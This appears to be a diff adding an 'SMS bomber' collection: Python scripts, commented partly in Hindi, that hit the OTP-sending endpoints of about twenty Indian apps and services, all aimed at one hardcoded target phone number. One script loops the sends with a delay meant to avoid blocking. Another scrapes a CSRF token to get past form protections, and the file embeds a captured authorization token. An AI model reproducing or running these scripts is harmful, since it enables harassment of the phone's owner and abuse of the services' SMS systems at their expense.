@@ -1,0 +1,404 @@
+https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=9665128322
+
+Api sms bom
+
+https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=9235575619
+
+--------------------------------
+import requests
+
+url = "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP"
+
+payload = {
+    "mobile_number": "9235575619",
+    "client_id": "kisan-app"
+}
+
+headers = {
+    "Content-Type": "application/json",
+    "Origin": "https://dehaat.in",
+    "Accept": "application/json"
+}
+
+response = requests.post(url, json=payload, headers=headers)
+
+print("Status:", response.status_code)
+print("Response:", response.text)
+
+------------------------------
+import requests
+
+url = "https://www.shemaroome.com/users/mobile_no_signup"
+
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
+}
+
+data = {
+    "mobile_no": "+919235575619",
+    "registration_source": "organic"
+}
+
+response = requests.post(url, headers=headers, data=data)
+
+print("Status Code:", response.status_code)
+print("Response Body:", response.text)
+
+
+---------------------------------------
+
+
+import requests
+
+url = "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create"
+
+payload = {
+    "country_code": "+91",
+    "phone": "9235575619"
+}
+
+headers = {
+    "Content-Type": "application/json"
+    # अगर token चाहिए तो:
+    # "x-authorization": "Bearer <your_access_token>"
+}
+
+response = requests.post(url, json=payload, headers=headers)
+
+print("Status Code:", response.status_code)
+print("Response:", response.text)
+
+-------------------------------------
+import requests
+
+url = "https://www.jockey.in/apps/jotp/api/login/send-otp/+919235575619?whatsapp=true"
+
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+    "Accept": "application/json, text/plain, /",
+    "Referer": "https://www.jockey.in/",   # 🔑 required
+    "Origin": "https://www.jockey.in",     # 🔑 required
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Dest": "empty",
+}
+
+response = requests.get(url, headers=headers)
+
+print("Status Code:", response.status_code)
+print("Response:", response.text)
+
+
+import requests
+import time
+
+url = "https://www.rupee112.com/login-sbm"
+
+# 🔹 Yaha apna number daal
+target_number = "9235575619"
+
+# 🔹 Device ID random rakhna better hai
+device_id = "3c2f1fb977b9f389dc7e60f5f3fa9c44"
+
+payload = {
+    "mobile": target_number,
+    "current_page": "login",
+    "is_existing_customer": "2",
+    "device_id": device_id
+}
+
+headers = {
+    "User-Agent": "Mozilla/5.0",
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+# 🔹 Kitne OTP bhejne hain
+count = 5
+
+for i in range(count):
+    try:
+        res = requests.post(url, data=payload, headers=headers, timeout=10)
+        print(f"[{i+1}] Status: {res.status_code} | Response: {res.text}")
+    except Exception as e:
+        print(f"[{i+1}] Error: {e}")
+    
+    time.sleep(3)  # 3 sec gap rakho warna block ho jayega
+
+import requests
+
+url = "https://api.penpencil.co/v1/users/get-otp?smsType=0&fallback=true"
+payload = {
+    "username": "9235575619",
+    "countryCode": "+91",
+    "organizationId": "5eb393ee95fab7468a79d189"
+}
+headers = {"Content-Type": "application/json"}
+
+response = requests.post(url, json=payload, headers=headers)
+print(response.json())
+
+
+import requests
+from bs4 import BeautifulSoup
+
+session = requests.Session()
+
+# Step 1: Homepage load karo
+homepage = session.get("https://vyaparapp.in/")
+print("Homepage:", homepage.status_code)
+
+# Token scrape karo
+soup = BeautifulSoup(homepage.text, "html.parser")
+token_input = soup.find("input", {"name": "_token"})
+if token_input:
+    token = token_input.get("value")
+    print("Token mil gaya:", token)
+else:
+    print("Token nahi mila!")
+    token = None
+
+# Step 2: Agar token mila to POST bhejna
+if token:
+    url = "https://vyaparapp.in/check/user"
+
+    headers = {
+        "accept": "/",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "origin": "https://vyaparapp.in",
+        "referer": "https://vyaparapp.in/",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+        "x-requested-with": "XMLHttpRequest"
+    }
+
+    data = {
+        "_token": token,
+        "country_code": "91",
+        "remaining_trial_period": "0",
+        "phone": "9235575619",
+        "firebase_otp": "",
+        "email": ""
+    }
+
+    response = session.post(url, headers=headers, data=data)
+    print("POST Status:", response.status_code)
+    print("Response:", response.text)
+
+import requests
+import json
+
+url = "https://feedback.crownit.in/api/survey/smart/answer/"
+
+headers = {
+    "Content-Type": "application/json",
+    "Authorization": "Basic NjY2Nzo3NTliMDY0Zi0zODFkLTExZTUtODEwYi0wMjg2Yzk2ZDI2NDE=",  # 👈 yeh token tumhare request se hai
+    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+    "Origin": "https://feedback.crownit.in",
+    "Referer": "https://feedback.crownit.in/lite/profile",
+}
+
+payload = {
+    "surveyId": "0ZaNEw3KW03mrlpD",
+    "utm_campaign": "",
+    "utm_medium": "",
+    "utm_source": "",
+    "otpGet": True,
+    "options": [
+        {
+            "id": "-1",
+            "text": "9235575619",
+            "web_source": "pwa",
+            "web_host_url": "@feedback.crownit.in"
+        }
+    ],
+    "unselect": [],
+    "questionId": "1068",
+    "seqNo": "-1",
+    "extraParams": {},
+    "webLink": "fb1755715631591",
+    "targetLanguage": "",
+    "cookies": {
+        "_fbp": "fb1755715631591"
+    },
+    "channel": "Z1ktbHpqLTNsWk0tZ1k=",
+    "unique": 1755715664680,
+    "survey_source": "browser"
+}
+
+res = requests.post(url, headers=headers, data=json.dumps(payload))
+
+print("Status:", res.status_code)
+print("Response:", res.text)
+
+import requests
+
+url = "https://communication.api.hungama.com/v1/communication/otp"
+
+payload = {
+    "mobileNo": "9235575619",
+    "countryCode": "+91",
+    "appCode": "un",
+    "messageId": "1",
+    "emailId": "",
+    "subject": "Register",
+    "priority": "1",
+    "device": "web",
+    "variant": "v1",
+    "templateCode": 1
+}
+
+headers = {
+    "Content-Type": "application/json"
+}
+
+response = requests.post(url, headers=headers, json=payload)
+
+print("Status:", response.status_code)
+print("Response:", response.text)
+
+import requests
+
+url = "https://www.shemaroome.com/users/mobile_no_signup"
+payload = {
+    "mobile_no": "+919235575619",
+    "registration_source": "organic"
+}
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+    "X-Requested-With": "XMLHttpRequest",
+    "Origin": "https://www.shemaroome.com",
+    "Referer": "https://www.shemaroome.com/users/sign_in"
+}
+
+res = requests.post(url, data=payload, headers=headers)
+
+print(res.status_code)
+print(res.text)
+
+import requests
+
+# Step 1: OTP Send
+send_url = "https://victorycinema.in/wp-admin/admin-ajax.php"
+payload = {
+    "action": "msg19_send_otp_sms",
+    "mobile_number": "919235575619"
+}
+
+response = requests.post(send_url, data=payload)
+print("Send OTP Response:", response.text)
+
+# Agar success aaya hai to request_id nikal lo
+try:
+    request_id = response.json().get("request_id")
+    print("Request ID:", request_id)
+except:
+    request_id = None
+
+# Step 2: OTP Verify (Structure)
+# ⚠ Yahan actual OTP dalna padega jo tumhare number par aayega
+if request_id:
+    verify_payload = {
+        "action": "msg19_verify_otp_sms",
+        "mobile_number": "919235575619",
+        "otp": "123476",          # <-- yahan apna received OTP dalna
+        "request_id": request_id
+    }
+    verify_resp = requests.post(send_url, data=verify_payload)
+    print("Verify OTP Response:", verify_resp.text)
+
+import requests
+
+url = "https://api.charzer.com/auth-service/dh-app/send-otp"
+
+payload = {
+    "mobileNumber": "9235575619",   # your number here
+    "appSource": "CHARZER_APP"
+}
+
+headers = {
+    "Content-Type": "application/json"
+}
+
+response = requests.post(url, json=payload, headers=headers)
+
+print("Status:", response.status_code)
+print("Response:", response.text)
+
+import requests
+
+url = "https://kukufm.com/api/v1/users/auth/send-otp/"
+
+payload = {
+    "phone_number": "+919235575619",
+    "recaptcha_token": "PASTE_VALID_RECAPTCHA_TOKEN_HERE"
+}
+
+headers = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0"
+}
+
+response = requests.post(url, json=payload, headers=headers)
+
+print("Status Code:", response.status_code)
+print("Response:", response.text)
+
+import requests
+
+url = "https://nibbly.in/app/proxy.php"
+params = {
+    "phone": "9235575619",  # Your phone number
+    "otp": "gandu"           # OTP you received
+}
+
+response = requests.get(url, params=params)
+
+print("Status Code:", response.status_code)
+print("Response:", response.text)
+
+import requests
+
+url = "https://api.vahak.in/v1/u/o_w"
+
+payload = {
+    "phone_number": "9235575619",
+    "scope": 0,
+    "request_meta_data": "X0oLFl9sAAZzHuhTmaHk5FuMENOfkkI5sPZU9Coit7IQ/o34XFicpeUxmpMleqmrhvsv2pvvZSCUO8fNR8/zNl3g2NSnvKgTROHkOGvQ7Mk=",
+    "is_whatsapp": True
+}
+
+headers = {
+    "Content-Type": "application/json",
+    "Accept": "application/json",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+    "Origin": "https://www.vahak.in",
+    "Referer": "https://www.vahak.in/"
+}
+
+response = requests.post(url, json=payload, headers=headers)
+
+print("Status Code:", response.status_code)
+print("Response:", response.text)
+
+import requests
+
+url = "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true"
+
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+    "x-app-id": "udaan-auth",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+    "Accept": "/",
+    "Origin": "https://auth.udaan.com",
+    "Referer": "https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2"
+}
+
+data = {
+    "mobile": "9235575619"   # yaha apna mobile number dalna
+}
+
+response = requests.post(url, headers=headers, data=data)
+
+print("Status Code:", response.status_code)
+print("Response:", response.text)
